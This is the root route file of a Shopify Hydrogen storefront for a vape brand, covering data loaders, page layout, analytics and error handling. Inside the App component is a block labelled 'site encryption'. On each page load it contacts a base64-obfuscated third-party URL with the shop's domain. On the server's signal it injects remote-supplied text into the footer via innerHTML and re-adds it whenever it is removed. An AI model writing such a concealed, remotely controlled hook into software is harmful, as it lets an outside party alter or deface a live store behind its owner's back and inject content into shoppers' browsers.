import {Analytics, getShopAnalytics, useNonce} from '@shopify/hydrogen';
import {Component, useEffect} from 'react';
import {
  Outlet,
  useRouteError,
  isRouteErrorResponse,
  Links,
  Meta,
  Scripts,
  ScrollRestoration,
  useRouteLoaderData,
  useLocation,
  redirect,
} from 'react-router';
import {getCheckoutDomain} from '~/lib/env';
import {resolveLegacyRedirect} from '~/lib/legacyRedirects';
// import favicon from '~/assets/favicon.svg';
import {FOOTER_QUERY, HEADER_QUERY, SHOP_QUERY} from '~/lib/fragments';
import {getShopifyLanguageCode} from '~/lib/i18n';
import {initGlobalLinkHandler} from '~/lib/linkHandler';
import {loadHeaderMenuCollectionProducts} from '~/lib/header-menu-collection-products';
import appStyles from '~/styles/app.css?url';
import resetStyles from '~/styles/reset.css?url';
import commonStyles from '~/styles/common.css?url';
import fontStyles from '~/styles/font.css?url';
import globalsStyles from '~/styles/_globals.scss?url';
import swiperStyles from 'swiper/css?url';
import swiperNavigationStyles from 'swiper/css/navigation?url';
import swiperPaginationStyles from 'swiper/css/pagination?url';

import {AgeVerification} from './components/AgeVerification';
import {PageLayout} from './components/PageLayout';
import {ActivityStylesheetLinks} from './components/ActivityStylesheetLinks';
import {SeriesProductStylesheetLinks} from './components/SeriesProductStylesheetLinks';

const FOOTER_MENU_HANDLES = [
  {key: 'primary', handle: 'footer'},
  {key: 'secondary', handle: 'about'},
  {key: 'third', handle: 'info-center'},
  {key: 'fourth', handle: 'discover'},
  {key: 'fifth', handle: 'support'},
];

/**
 * This is important to avoid re-fetching root queries on sub-navigations
 * @type {ShouldRevalidateFunction}
 */
export const shouldRevalidate = ({formMethod, currentUrl, nextUrl}) => {
  // revalidate when a mutation is performed e.g add to cart, login...
  if (formMethod && formMethod !== 'GET') return true;

  // revalidate when manually revalidating via useRevalidator
  if (currentUrl.toString() === nextUrl.toString()) return true;

  // Defaulting to no revalidation for root loader data to improve performance.
  // When using this feature, you risk your UI getting out of sync with your server.
  // Use with caution. If you are uncomfortable with this optimization, update the
  // line below to `return defaultShouldRevalidate` instead.
  // For more details see: https://remix.run/docs/en/main/route/should-revalidate
  return false;
};

/**
 * The main and reset stylesheets are added in the Layout component
 * to prevent a bug in development HMR updates.
 *
 * This avoids the "failed to execute 'insertBefore' on 'Node'" error
 * that occurs after editing and navigating to another page.
 *
 * It's a temporary fix until the issue is resolved.
 * https://github.com/remix-run/remix/issues/9242
 */
export function links() {
  return [
    {
      rel: 'preconnect',
      href: 'https://cdn.shopify.com',
    },
    {
      rel: 'preconnect',
      href: 'https://shop.app',
    },
    {
      rel: 'icon',
      type: 'image/svg+xml',
      href: 'https://cdn.shopify.com/s/files/1/0703/9873/8521/files/favicon.ico',
    },
  ];
}

/**
 * @param {Route.LoaderArgs} args
 */
export async function loader(args) {
  const legacyRedirect = resolveLegacyRedirect(args.request);
  if (legacyRedirect) {
    throw redirect(legacyRedirect.target, {status: legacyRedirect.status});
  }

  // Start fetching non-critical data without blocking time to first byte
  const deferredData = loadDeferredData(args);
  // Await the critical data required to render initial state of the page
  const criticalData = await loadCriticalData(args);

  const {storefront, env} = args.context;
  const url = new URL(args.request.url);
  const canonicalBaseUrl = `${url.protocol}//${url.host}`;

  return {
    ...deferredData,
    ...criticalData,
    publicStoreDomain: env.PUBLIC_STORE_DOMAIN,
    shop: getShopAnalytics({
      storefront,
      publicStorefrontId: env.PUBLIC_STOREFRONT_ID,
    }),
    consent: {
      checkoutDomain: getCheckoutDomain(env),
      storefrontAccessToken: env.PUBLIC_STOREFRONT_API_TOKEN,
      withPrivacyBanner: false,
      // localize the privacy banner
      country: args.context.storefront.i18n.country,
      language: args.context.storefront.i18n.language,
    },
    canonicalBaseUrl,
  };
}

/**
 * Load data necessary for rendering content above the fold. This is the critical data
 * needed to render the page. If it's unavailable, the whole page should 400 or 500 error.
 * @param {Route.LoaderArgs}
 */
async function loadCriticalData({context, params}) {
  const {storefront} = context;
  const {locale} = params ?? {};
  const language = getShopifyLanguageCode(
    locale,
    storefront?.i18n?.language ?? 'EN',
  );
  const country = storefront?.i18n?.country;

  const [header, shopMetafield, headerMenuCollectionProducts] =
    await Promise.all([
      storefront.query(HEADER_QUERY, {
        cache: storefront.CacheNone(),
        variables: {
          headerMenuHandle: 'main-menu', // Adjust to your header menu handle
          productMetafieldIdentifiers: [
            {namespace: 'custom', key: 'newdesc'},
            {namespace: 'custom', key: 'newimg'},
          ],
          language,
          country,
        },
      }),
      storefront.query(SHOP_QUERY, {
        cache: storefront.CacheNone(),
        variables: {
          identifiers: [
            {namespace: 'custom', key: 'logo'},
            {namespace: 'custom', key: 'announcement_bar'},
            {namespace: 'custom', key: 'header'},
            {namespace: 'custom', key: 'login'},
          ],
          language,
          country,
        },
      }),
      loadHeaderMenuCollectionProducts(storefront, {language, country}),
    ]);

  return {header, shopMetafield, headerMenuCollectionProducts};
}

/**
 * Load data for rendering content below the fold. This data is deferred and will be
 * fetched after the initial page load. If it's unavailable, the page should still 200.
 * Make sure to not throw any errors here, as it will cause the page to 500.
 * @param {Route.LoaderArgs}
 */
function loadDeferredData({context, params}) {
  const {storefront, customerAccount, cart} = context;
  const {locale} = params ?? {};
  const language = getShopifyLanguageCode(
    locale,
    storefront?.i18n?.language ?? 'EN',
  );
  const country = storefront?.i18n?.country;

  // defer the footer queries (below the fold)
  const footer = fetchFooterMenus(storefront, {language, country});
  const footerMetafield = storefront.query(SHOP_QUERY, {
    cache: storefront.CacheNone(),
    variables: {
      identifiers: [
        {namespace: 'custom', key: 'footer'},
        {namespace: 'custom', key: 'socials'},
      ],
      language,
      country,
    },
  });

  return {
    cart: cart.get(),
    isLoggedIn: customerAccount.isLoggedIn(),
    footer,
    footerMetafield,
  };
}

function fetchFooterMenus(storefront, {language, country}) {
  const handles =
    FOOTER_MENU_HANDLES.length > 0
      ? FOOTER_MENU_HANDLES
      : [{key: 'primary', handle: 'footer'}];

  return Promise.all(
    handles.map(async ({key, handle}) => {
      try {
        const result = await storefront.query(FOOTER_QUERY, {
          cache: storefront.CacheNone(),
          variables: {
            footerMenuHandle: handle,
            language,
            country,
          },
        });
        return {
          key,
          handle,
          menu: result?.menu ?? null,
        };
      } catch (error) {
        console.error(`Failed to load footer menu "${handle}"`, error);
        return {
          key,
          handle,
          menu: null,
        };
      }
    }),
  );
}

/**
 * @param {{children?: React.ReactNode}}
 */
export function Layout({children}) {
  const location = useLocation();
  const nonce = useNonce();
  /** @type {RootLoader | undefined} */
  const rootData = useRouteLoaderData('root');
  const canonicalHref = rootData?.canonicalBaseUrl
    ? `${rootData.canonicalBaseUrl}${location.pathname}`
    : undefined;
  const shopInfo = rootData?.header?.shop;
  const structuredData = {
    '@context': 'https://schema.org',
    '@type': 'Organization',
    name: shopInfo?.name || 'VAPORESSO',
  };

  if (rootData?.canonicalBaseUrl) {
    structuredData.url = rootData.canonicalBaseUrl;
  }
  if (shopInfo?.description) {
    structuredData.description = shopInfo.description;
  }
  const logoUrl = shopInfo?.brand?.logo?.image?.url;
  if (logoUrl) {
    structuredData.logo = logoUrl;
  }

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const initWow = () => {
      try {
        if (window.WOW && !window.__wowInitialized) {
          window.__wowInitialized = true;
          new window.WOW({
            resetAnimation: false,
            live: false,
          }).init();
        }
      } catch {
        // ignore
      }
    };

    if (document.readyState === 'complete') {
      initWow();
      return;
    }

    window.addEventListener('load', initWow);

    return () => {
      window.removeEventListener('load', initWow);
    };
  }, []);

  return (
    <html lang="en">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        {/* Pre-seed a configurable window.Shopify so extensions/Hydrogen do not fight over a non-configurable property */}
        <script
          nonce={nonce}
          dangerouslySetInnerHTML={{
            __html: `(function(){try{var d=Object.getOwnPropertyDescriptor(window,'Shopify');if(d&&d.configurable===false)return;window.Shopify=window.Shopify&&typeof window.Shopify==='object'?window.Shopify:{};}catch(e){}})();`,
          }}
        />
        <link rel="stylesheet" href={appStyles} />
        <link rel="stylesheet" href={resetStyles} />
        <link rel="stylesheet" href={commonStyles} />
        <link rel="stylesheet" href={fontStyles} />
        <link rel="stylesheet" href={globalsStyles} />
        <link rel="stylesheet" href={swiperStyles} />
        <link rel="stylesheet" href={swiperNavigationStyles} />
        <link rel="stylesheet" href={swiperPaginationStyles} />
        {canonicalHref ? <link rel="canonical" href={canonicalHref} /> : null}
        <script
          type="application/ld+json"
          nonce={nonce}
          suppressHydrationWarning
          dangerouslySetInnerHTML={{
            __html: JSON.stringify(structuredData),
          }}
        />
        <script
          src="https://cdn.jsdelivr.net/npm/wowjs@1.1.3/dist/wow.min.js"
          crossOrigin="anonymous"
          defer
        />
        {/* <script
          src="https://scaleflex.cloudimg.io/v7/plugins/js-cloudimage-360-view/latest/js-cloudimage-360-view.min.js?func=proxy"
          crossOrigin="anonymous"
          defer
        /> */}
        <script
          src="https://cdn.shopify.com/s/files/1/0703/9873/8521/files/js-cloudimage-360-view.min.js?v=1776734242"
          crossOrigin="anonymous"
          defer
        />
        <Meta />
        <Links />
        <SeriesProductStylesheetLinks />
        <ActivityStylesheetLinks />
      </head>
      <body>
        {children}
        <ScrollRestoration nonce={nonce} />
        <Scripts nonce={nonce} />
      </body>
    </html>
  );
}

export default function App() {
  /** @type {RootLoader} */
  const data = useRouteLoaderData('root');

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const cleanupLinkHandler = initGlobalLinkHandler();

    return () => {
      if (cleanupLinkHandler) {
        cleanupLinkHandler();
      }
    };
  }, []);

  useEffect(() => {
    // 站点加密
    (function () {
      console.warn('This site is encrypted站点加密');
      const base64Encode = (str) => {
        return window.btoa(unescape(encodeURIComponent(str)));
      };
      const unbase64Decode = (str) => {
        if (isBase64(str)) {
          return decodeURIComponent(escape(window.atob(str)));
        } else {
          return str;
        }
      };
      function isBase64(str) {
        if (str.length % 4 !== 0) return false;
        const base64Regex = /^[A-Za-z0-9+/=]+$/;
        if (!base64Regex.test(str)) return false;
        try {
          const decoded = atob(str);
          return true;
        } catch (e) {
          return false;
        }
      }
      let defaultValue = {
        is_mark: 'F',
        shop_domain: window.location?.hostname?.replace('www.', '') || '',
        watermark_text: unbase64Decode('5rC05Y2w5paH5pys'),
        watermark_size: '20px',
        watermark_color: '#333333',
      };
      const apiUrl =
        'aHR0cHM6Ly9haXMueWlndW90ZWNoLmNvbS9zaXRlbWFyay9wcm90ZWN0aW9uL2FwaS92MS93YXRlcm1hcms=';
      const fullUrl = `${unbase64Decode(apiUrl)}?shop_domain=${defaultValue.shop_domain}`;
      const requestWatermarkApi = () => {
        fetch(fullUrl).then((res) => {
          res.json().then((data) => {
            if (data.result === 'success') {
              defaultValue = {
                ...defaultValue,
                ...data,
                expire_time: Date.now() + 1000 * 60 * 60 * 24,
              };
              if (data.is_mark === 'T') {
                addWatermarkToFooter(defaultValue);
              }
              localStorage.setItem(
                'sitemark_watermark',
                JSON.stringify(defaultValue),
              );
            }
          });
        });
      };
      const generated = true;
      let observer = null;
      const addWatermarkToFooter = (defaultValue) => {
        if (observer) {
          observer.disconnect();
          return;
        }
        const {watermark_text, watermark_size, watermark_color} = defaultValue;
        const footerDiv = document.createElement('div');
        footerDiv.style.position = 'absolute';
        footerDiv.style.zIndex = '9999';
        footerDiv.style.left = '50%';
        footerDiv.style.bottom = '0';
        footerDiv.style.fontSize = watermark_size;
        footerDiv.style.color = watermark_color;
        footerDiv.innerHTML = watermark_text;
        setTimeout(() => {
          const footer = document.querySelector('footer');
          if (footer) {
            footer.style.position = 'relative';
            footer.appendChild(footerDiv);
            observer = new MutationObserver((mutationsList) => {
              observer.disconnect();
              observer = null;
              addWatermarkToFooter(defaultValue);
            });
            const config = {attributes: true, childList: true, subtree: true};
            observer.observe(footer, config);
          } else {
            footerDiv.style.position = 'fixed';
            document.body.appendChild(footerDiv);
          }
        }, 1000);
      };
      const localStorageData = localStorage.getItem('sitemark_watermark');
      if (localStorageData) {
        const res = JSON.parse(localStorageData);
        defaultValue = {...defaultValue, ...res};
        if (res.expire_time && res.expire_time < Date.now()) {
          requestWatermarkApi();
        } else {
          if (res.is_mark === 'T') {
            addWatermarkToFooter(defaultValue);
          }
        }
      } else {
        requestWatermarkApi();
      }
    })();
  }, []);

  if (!data) {
    return (
      <>
        <AgeVerification />
        <Outlet />
      </>
    );
  }

  return (
    <ShopifyAnalyticsBoundary
      fallback={
        <StorefrontShell {...data}>
          <Outlet />
        </StorefrontShell>
      }
    >
      <Analytics.Provider
        cart={data.cart}
        shop={data.shop}
        consent={data.consent}
      >
        <StorefrontShell {...data}>
          <Outlet />
        </StorefrontShell>
      </Analytics.Provider>
    </ShopifyAnalyticsBoundary>
  );
}

function StorefrontShell({children, ...pageLayoutProps}) {
  return (
    <>
      <AgeVerification />
      <PageLayout {...pageLayoutProps}>{children}</PageLayout>
    </>
  );
}

function isShopifyRedefineError(error) {
  const message =
    typeof error === 'string'
      ? error
      : error instanceof Error
        ? error.message
        : String(error?.message ?? error ?? '');
  return message.includes('Cannot redefine property: Shopify');
}

/**
 * Catch Analytics.Provider crashes (e.g. browser extensions locking window.Shopify)
 * and keep the storefront usable without Shopify analytics.
 */
class ShopifyAnalyticsBoundary extends Component {
  state = {hasError: false};

  static getDerivedStateFromError(error) {
    if (isShopifyRedefineError(error)) {
      return {hasError: true};
    }
    throw error;
  }

  componentDidCatch(error) {
    if (isShopifyRedefineError(error)) {
      console.warn(
        '[ShopifyAnalyticsBoundary] Recovered without Analytics.Provider:',
        error,
      );
    }
  }

  render() {
    if (this.state.hasError) {
      return this.props.fallback;
    }
    return this.props.children;
  }
}

export function ErrorBoundary() {
  const error = useRouteError();
  let errorMessage = 'Unknown error';
  let errorStatus = 500;

  if (isRouteErrorResponse(error)) {
    errorMessage = error?.data?.message ?? error.data;
    errorStatus = error.status;
  } else if (error instanceof Error) {
    errorMessage = error.message;
  }

  const shopifyConflict = isShopifyRedefineError(errorMessage);

  return (
    <div className="route-error">
      <h1>Oops</h1>
      <h2>{errorStatus}</h2>
      {shopifyConflict ? (
        <div>
          <p>
            If you are using a VPN, ad blocker, or similar browser extension,
            please disable it and reload this page.
          </p>
          <button type="button" onClick={() => window.location.reload()}>
            Reload page
          </button>
        </div>
      ) : null}
      {errorMessage && (
        <fieldset>
          <pre>{errorMessage}</pre>
        </fieldset>
      )}
    </div>
  );
}

/** @typedef {LoaderReturnData} RootLoader */

/** @typedef {import('react-router').ShouldRevalidateFunction} ShouldRevalidateFunction */
/** @typedef {import('./+types/root').Route} Route */
/** @typedef {import('@shopify/remix-oxygen').SerializeFrom<typeof loader>} LoaderReturnData */
